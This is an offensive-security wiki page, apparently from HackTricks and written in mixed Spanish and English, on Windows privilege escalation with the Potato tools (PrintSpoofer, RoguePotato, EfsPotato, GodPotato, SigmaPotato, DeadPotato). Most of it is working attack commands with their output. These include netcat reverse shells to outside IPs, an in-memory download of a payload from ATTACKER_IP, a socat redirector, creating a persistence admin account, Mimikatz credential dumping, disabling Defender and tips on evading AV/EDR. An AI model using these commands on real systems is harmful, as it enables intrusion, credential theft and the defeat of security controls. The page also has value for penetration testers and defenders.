# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato doesn't work** on Windows Server 2019 and Windows 10 build 1809 onwards. However, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** can be used to **leverage the same privileges and gain `NT AUTHORITY\SYSTEM`** level access. This [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) goes in-depth on the `PrintSpoofer` tool, which can be used to abuse impersonation privileges on Windows 10 and Server 2019 hosts where JuicyPotato no longer works.

> [!TIP]
> A modern alternative frequently maintained in 2024–2025 is SigmaPotato (a fork of GodPotato) which adds in-memory/.NET reflection usage and extended OS support. See quick usage below and the repo in References.

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Requisitos y problemas comunes

All the following techniques rely on abusing an impersonation-capable privileged service from a context holding either of these privileges:

- SeImpersonatePrivilege (el más común) o SeAssignPrimaryTokenPrivilege
- High integrity is not required if the token already has SeImpersonatePrivilege (típico para muchas cuentas de servicio como IIS AppPool, MSSQL, etc.)

Check privileges quickly:
```cmd
whoami /priv | findstr /i impersonate
```
Notas operativas:

- Si tu shell se ejecuta bajo un token restringido que carece de SeImpersonatePrivilege (común para Local Service/Network Service en algunos contextos), recupera los privilegios por defecto de la cuenta usando FullPowers, y luego ejecuta un Potato. Ejemplo: `FullPowers.exe -c "cmd /c whoami /priv" -z`
- PrintSpoofer necesita que el servicio Print Spooler esté en ejecución y accesible vía el endpoint RPC local (spoolss). En entornos endurecidos donde Spooler está deshabilitado tras PrintNightmare, prefiere RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- RoguePotato requiere un OXID resolver accesible en TCP/135. Si el egress está bloqueado, usa un redirector/port-forwarder (ver ejemplo abajo). Las versiones antiguas necesitaban el flag -f.
- EfsPotato/SharpEfsPotato abusan de MS-EFSR; si una pipe está bloqueada, prueba pipes alternativos (lsarpc, efsrpc, samr, lsass, netlogon).
- El error 0x6d3 durante RpcBindingSetAuthInfo típicamente indica un servicio de autenticación RPC desconocido/no soportado; intenta otra pipe/transporte o asegúrate de que el servicio objetivo esté en ejecución.
- Las forks “Kitchen-sink” como DeadPotato incluyen módulos de payload extra (Mimikatz/SharpHound/Defender off) que tocan disco; espera mayor detección por EDR comparado con los originales slim.

## Demostración rápida

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
Notas:
- Puedes usar -i para iniciar un proceso interactivo en la consola actual, o -c para ejecutar un one-liner.
- Requiere el servicio Spooler. Si está deshabilitado, esto fallará.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
Si el puerto 135 saliente está bloqueado, pivot the OXID resolver via socat on your redirector:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### PrintNotifyPotato

PrintNotifyPotato es una primitiva de abuso COM más reciente publicada a finales de 2022 que apunta al servicio **PrintNotify** en lugar de Spooler/BITS. El binario instancia el servidor COM de PrintNotify, inserta un `IUnknown` falso y luego provoca una devolución de llamada privilegiada mediante `CreatePointerMoniker`. Cuando el servicio PrintNotify (ejecutándose como **SYSTEM**) se reconecta, el proceso duplica el token devuelto y ejecuta la payload suministrada con privilegios completos.

Notas operativas clave:

* Funciona en Windows 10/11 y Windows Server 2012–2022 siempre que el servicio Print Workflow/PrintNotify esté instalado (está presente incluso cuando el Spooler heredado está deshabilitado después de PrintNightmare).
* Requiere que el contexto de llamada tenga **SeImpersonatePrivilege** (típico para cuentas de servicio IIS APPPOOL, MSSQL y cuentas de servicio de tareas programadas).
* Acepta un comando directo o un modo interactivo para que puedas permanecer en la consola original. Ejemplo:

```cmd
PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
PrintNotifyPotato.exe whoami
```

* Debido a que es puramente COM-based, no se requieren listeners de named-pipe ni redirectors externos, por lo que es un reemplazo directo en hosts donde Defender bloquea el RPC binding de RoguePotato.

Operadores como Ink Dragon disparan PrintNotifyPotato inmediatamente después de obtener ViewState RCE en SharePoint para pivotar desde el worker w3wp.exe a **SYSTEM** antes de instalar ShadowPad.

### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
Consejo: Si una pipe falla o el EDR la bloquea, prueba las otras pipes compatibles:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Notas:
- Funciona en Windows 8/8.1–11 y Server 2012–2022 cuando SeImpersonatePrivilege está presente.

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato proporciona dos variantes que apuntan a objetos DCOM de servicio que por defecto utilizan RPC_C_IMP_LEVEL_IMPERSONATE. Compila o usa los binarios provistos y ejecuta tu comando:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (fork actualizado de GodPotato)

SigmaPotato añade comodidades modernas como ejecución en memoria vía .NET reflection y un asistente de PowerShell para reverse shell.
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
Mejoras adicionales en las versiones 2024–2025 (v1.2.x):
- Built-in reverse shell flag `--revshell` and removal of the 1024-char PowerShell limit so you can fire long AMSI-bypassing payloads in one go.
- Reflection-friendly syntax (`[SigmaPotato]::Main()`), plus a rudimentary AV evasion trick via `VirtualAllocExNuma()` to throw off simple heuristics.
- Separate `SigmaPotatoCore.exe` compiled against .NET 2.0 for PowerShell Core environments.

### DeadPotato (revisión 2024 de GodPotato con módulos)

DeadPotato mantiene la cadena de impersonation OXID/DCOM de GodPotato pero incorpora helpers de post-exploitation para que los operadores puedan tomar SYSTEM de inmediato y realizar persistence/collection sin herramientas adicionales.

Módulos comunes (todos requieren SeImpersonatePrivilege):

- `-cmd "<cmd>"` — ejecutar un comando arbitrario como SYSTEM.
- `-rev <ip:port>` — reverse shell rápido.
- `-newadmin user:pass` — crear un administrador local para persistence.
- `-mimi sam|lsa|all` — desplegar y ejecutar Mimikatz para volcar credenciales (escribe en disco, ruidoso).
- `-sharphound` — ejecutar la colección SharpHound como SYSTEM.
- `-defender off` — desactivar la protección en tiempo real de Defender (muy ruidoso).

Ejemplos de one-liners:
```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```
Porque incluye binarios adicionales, espera más detecciones por AV/EDR; usa las versiones más ligeras GodPotato/SigmaPotato cuando la sigilosidad importe.

## Referencias

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [FullPowers – Restaurar los privilegios de token predeterminados para cuentas de servicio](https://github.com/itm4n/FullPowers)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [Check Point Research – Inside Ink Dragon: Revelando la red de retransmisión y el funcionamiento interno de una operación ofensiva sigilosa](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [DeadPotato – Rework de GodPotato con módulos post-ex integrados](https://github.com/lypd0/DeadPotato)

{{#include ../../banners/hacktricks-training.md}}
